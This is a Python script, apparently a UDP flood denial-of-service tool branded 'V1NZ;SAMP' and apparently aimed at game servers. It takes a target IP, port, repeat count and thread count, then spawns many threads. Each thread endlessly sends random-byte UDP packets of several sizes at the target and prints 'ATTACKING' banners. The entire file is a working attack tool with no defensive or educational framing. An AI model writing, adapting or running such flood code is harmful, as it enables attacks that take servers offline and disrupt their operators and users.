import os, sys, time, socket, random, threading, getpass

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])

def v1nzsamp1():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
				s.sendto(data, addr)
			print("\033[95mV1NZ;SAMP ATTACKING \u001b[31m════> TO IP \033[0m{}\u001b[31m AND PORT \033[0m{}".format(ip, port))
		except:
			print("\033[95mServer has been maintenace\033[0m")

def v1nzsamp2():
	data = random._urandom(1490)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
				s.sendto(data, addr)
			print("\033[95mV1NZ;SAMP ATTACKING \u001b[31m════> TO IP \033[0m{}\u001b[31m AND PORT \033[0m{}".format(ip, port))
		except:
			print("\033[95mServer has been maintenace\033[0m")

def v1nzsamp3():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
				s.sendto(data, addr)
			print("\033[95mV1NZ;SAMP ATTACKING \u001b[31m════> TO IP \033[0m{}\u001b[31m AND PORT \033[0m{}".format(ip, port))
		except:
			print("\033[95mServer has been maintenace\033[0m")

def v1nzsamp4():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
				s.sendto(data, addr)
			print("\033[95mV1NZ;SAMP ATTACKING \u001b[31m════> TO IP \033[0m{}\u001b[31m AND PORT \033[0m{}".format(ip, port))
		except:
			print("\033[95mServer has been maintenace\033[0m")

for _i in range(threads):
	threading.Thread(target=v1nzsamp1).start()
	threading.Thread(target=v1nzsamp2).start()
	threading.Thread(target=v1nzsamp3).start()
	threading.Thread(target=v1nzsamp4).start()

for _x in range(threads):
	threading.Thread(target=v1nzsamp1).start()
	threading.Thread(target=v1nzsamp4).start()
